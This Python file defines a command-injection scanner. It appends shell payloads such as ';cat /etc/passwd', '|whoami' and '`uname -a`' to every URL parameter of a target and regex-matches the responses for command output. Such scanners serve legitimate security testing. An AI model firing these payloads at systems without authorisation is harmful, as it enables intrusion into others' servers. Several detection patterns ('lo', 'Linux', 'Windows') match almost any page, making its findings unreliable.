import requests
import re
from colorama import Fore, Style
import urllib.parse

class CommandInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.common_commands = [
            ';ls',
            ';cat /etc/passwd',
            ';whoami',
            ';id',
            ';pwd',
            ';uname -a',
            ';netstat -an',
            ';ifconfig',
            ';ipconfig',
            ';dir',
            ';type',
            ';echo test',
            '|ls',
            '|cat /etc/passwd',
            '|whoami',
            '|id',
            '|pwd',
            '|uname -a',
            '|netstat -an',
            '|ifconfig',
            '|ipconfig',
            '|dir',
            '|type',
            '|echo test',
            '`ls`',
            '`cat /etc/passwd`',
            '`whoami`',
            '`id`',
            '`pwd`',
            '`uname -a`',
            '`netstat -an`',
            '`ifconfig`',
            '`ipconfig`',
            '`dir`',
            '`type`',
            '`echo test`'
        ]

    def scan_command_injection(self):
        print(f"\n{Fore.CYAN}[*] Starting Command Injection Scan...{Style.RESET_ALL}")
        
        try:
            # Get all parameters from URL
            parsed_url = urllib.parse.urlparse(self.target_url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            # Test each parameter
            for param in params:
                self._test_parameter(param)
            
            # Print results
            self._print_results()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error during command injection scan: {str(e)}{Style.RESET_ALL}")

    def _test_parameter(self, param):
        print(f"{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
        
        for command in self.common_commands:
            try:
                # Create payload
                payload = urllib.parse.quote(command)
                
                # Send request
                response = requests.get(f"{self.target_url}&{param}={payload}")
                
                # Check response
                if self._check_response(response.text):
                    self.vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'High',
                        'description': f'Parameter {param} may be vulnerable to command injection using payload: {command}'
                    })
                    
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing payload {command}: {str(e)}{Style.RESET_ALL}")

    def _check_response(self, response_text):
        # Check for common command output patterns
        patterns = [
            r'root:.*:0:0:',
            r'bin:.*:1:1:',
            r'daemon:.*:2:2:',
            r'Directory of',
            r'Volume Serial Number',
            r'inet addr:',
            r'eth0',
            r'lo',
            r'Active Internet connections',
            r'Proto.*Recv-Q.*Send-Q.*Local Address.*Foreign Address.*State',
            r'Linux',
            r'Windows',
            r'Darwin',
            r'uid=',
            r'gid=',
            r'groups=',
            r'Directory of',
            r'<DIR>',
            r'File(s)',
            r'bytes free'
        ]
        
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        return False

    def _print_results(self):
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] No command injection vulnerabilities found{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}[!] Found {len(self.vulnerabilities)} potential issues:{Style.RESET_ALL}")
        for vuln in self.vulnerabilities:
            severity_color = {
                'High': Fore.RED,
                'Medium': Fore.YELLOW,
                'Low': Fore.BLUE,
                'Info': Fore.CYAN
            }.get(vuln['severity'], Fore.WHITE)
            
            print(f"\n{severity_color}[{vuln['severity']}] {vuln['type']}{Style.RESET_ALL}")
            print(f"Description: {vuln['description']}") 